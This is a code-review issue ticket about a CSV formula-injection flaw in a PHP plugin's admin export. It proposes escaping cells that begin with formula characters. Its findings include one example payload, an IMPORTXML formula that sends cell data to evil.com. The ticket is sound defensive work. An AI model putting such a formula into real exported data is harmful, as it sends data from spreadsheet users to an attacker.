---
status: complete
priority: p1
issue_id: "058"
tags: [code-review, security, csv]
dependencies: []
---

# CSV Formula Injection in Exported Data

## Problem Statement
The CSV export writes raw database values via `fputcsv()`. URL values, anchor text, post titles, and error messages are user-influenced data. If a URL or anchor text begins with `=`, `+`, `-`, `@`, `\t`, or `\r`, spreadsheet applications (Excel, Google Sheets, LibreOffice) may interpret the cell as a formula, enabling DDE/formula injection attacks.

## Findings
**File:** `src/Admin/ResultsPage.php` lines 289-308
Found by: security-sentinel

An attacker creates a post with a link whose anchor text is `=IMPORTXML("https://evil.com/steal?cookie="&A1, "//body")`. When an admin exports CSV and opens in Excel, the formula executes.

## Proposed Solutions

### Option A: Prefix dangerous cell values
- **Approach:** Prefix any cell value starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote to neutralize formula interpretation. Apply to all exported fields.
- **Effort:** Small

## Acceptance Criteria
- [ ] Exported CSV values beginning with formula characters are neutralized
- [ ] CSV still imports cleanly in spreadsheet applications

## Work Log
| Date | Action | Notes |
|------|--------|-------|
| 2026-03-03 | Created | From full codebase review |
